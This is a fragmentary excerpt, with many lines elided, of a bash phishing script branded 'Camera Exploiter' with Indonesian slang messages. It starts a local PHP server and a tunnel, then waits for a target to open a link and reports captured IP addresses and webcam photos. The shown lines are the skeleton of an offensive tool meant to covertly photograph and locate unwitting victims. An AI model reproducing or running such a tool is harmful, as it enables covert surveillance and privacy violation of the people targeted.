...
printf " \e[1;77m Camera Exploiter | Created By ®YanzzOfficial \e[0m \n"
printf " \e[1;77m Kuntulll \e[0m \n"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tunggu target buka webnya bwang,\e[0m\e[1;77m Pencet Ctrl + C buat kembali...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target Udah buka linknya wak!\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto nya dah ke ambil liat aja tuh!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] membikin anak, maksudnya Server...\e[0m\n"
...
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] bikin php server... (localhost:3333)\e[0m\n"
...
printf "\e[1;93m [!] Invalid tunnel option! gagal bang\e[0m\n"
sleep 1
clear
banner
camphish
